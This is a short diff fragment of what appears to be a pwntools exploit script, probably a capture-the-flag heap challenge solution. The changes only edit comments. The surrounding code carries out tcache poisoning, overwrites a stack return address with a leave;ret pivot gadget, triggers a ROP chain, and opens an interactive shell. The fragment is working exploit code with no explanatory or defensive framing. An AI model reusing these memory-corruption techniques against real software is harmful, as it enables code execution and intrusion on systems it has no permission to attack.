@@ -213,8 +213,8 @@ u(chunk_C, p64(protect(main_ret-0x8, heap+0x2e0))) # tcache poisoning
 
 a(0x18, b'aaa') # allocate authentic chunk
 
-a(0x18, p64(heap+0x950) + p64(leave_ret)) # overwrite main retn on stack with a stack pivot gadget
+a(0x18, p64(heap+0x950) + p64(leave_ret)) # overwrite return address on stack with a stack pivot gadget
 
-io.sendlineafter(b'Command: ', b'5')
+io.sendlineafter(b'Command: ', b'5') # trigger rop chain execution
 
 io.interactive()
